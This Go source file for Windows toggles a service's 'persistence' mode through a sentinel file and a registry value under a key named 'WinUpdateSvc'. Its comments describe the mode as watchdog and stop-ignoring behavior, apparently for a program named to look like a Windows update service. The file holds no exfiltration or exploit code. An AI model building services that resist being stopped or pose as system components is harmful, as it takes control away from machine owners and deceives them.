//go:build windows

package lifecycle

import (
	"os"
	"path/filepath"
	"sync"

	"golang.org/x/sys/windows/registry"
)

var (
	persistenceMu       sync.RWMutex
	persistenceEnabled  = true
	persistenceSentinel string
	disableRegPath      = `SOFTWARE\WinUpdateSvc`
	disableRegValue     = `Disable`
)

// DisablePersistence turns off watchdog/stop-ignoring behavior and writes a
// sentinel file next to the installed binary so running services allow stop.
func DisablePersistence(installPath string) {
	persistenceMu.Lock()
	persistenceEnabled = false
	persistenceSentinel = persistenceFlagPath(installPath)
	persistenceMu.Unlock()

	if persistenceSentinel != "" {
		if f, err := os.Create(persistenceSentinel); err == nil {
			_ = f.Close()
		} else {
			alt := filepath.Join(os.TempDir(), filepath.Base(persistenceSentinel))
			if err := os.WriteFile(alt, []byte{}, 0600); err == nil {
				persistenceMu.Lock()
				persistenceSentinel = alt
				persistenceMu.Unlock()
			}
		}
	}
	setRegistryDisableFlag()
}

func setRegistryDisableFlag() {
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, disableRegPath, registry.SET_VALUE); err == nil {
		_ = k.SetDWordValue(disableRegValue, 1)
		_ = k.Close()
	} else if k, _, err := registry.CreateKey(registry.CURRENT_USER, disableRegPath, registry.SET_VALUE); err == nil {
		_ = k.SetDWordValue(disableRegValue, 1)
		_ = k.Close()
	}
}

// EnablePersistence re-enables watchdog/stop-ignoring behavior by removing
// the sentinel file and registry flag.
func EnablePersistence(installPath string) {
	persistenceMu.Lock()
	persistenceEnabled = true
	sentinel := persistenceFlagPath(installPath)
	persistenceSentinel = ""
	persistenceMu.Unlock()

	// Remove sentinel file
	if sentinel != "" {
		_ = os.Remove(sentinel)
	}

	// Clear registry flag
	clearRegistryDisableFlag()
}

func clearRegistryDisableFlag() {
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, disableRegPath, registry.SET_VALUE); err == nil {
		_ = k.DeleteValue(disableRegValue)
		_ = k.Close()
	}
	if k, err := registry.OpenKey(registry.CURRENT_USER, disableRegPath, registry.SET_VALUE); err == nil {
		_ = k.DeleteValue(disableRegValue)
		_ = k.Close()
	}
}

func persistenceAllowed(installPath string) bool {
	persistenceMu.RLock()
	enabled := persistenceEnabled
	sentinel := persistenceSentinel
	persistenceMu.RUnlock()
	if !enabled {
		return false
	}
	if sentinel == "" {
		sentinel = persistenceFlagPath(installPath)
	}
	if sentinel == "" {
		return enabled
	}
	if _, err := os.Stat(sentinel); err == nil {
		return false
	}
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, disableRegPath, registry.QUERY_VALUE); err == nil {
		if v, _, err := k.GetIntegerValue(disableRegValue); err == nil && v == 1 {
			_ = k.Close()
			return false
		}
		_ = k.Close()
	}
	if k, err := registry.OpenKey(registry.CURRENT_USER, disableRegPath, registry.QUERY_VALUE); err == nil {
		if v, _, err := k.GetIntegerValue(disableRegValue); err == nil && v == 1 {
			_ = k.Close()
			return false
		}
		_ = k.Close()
	}
	return true
}

func persistenceFlagPath(installPath string) string {
	if installPath == "" {
		return ""
	}
	return installPath + ".disable"
}
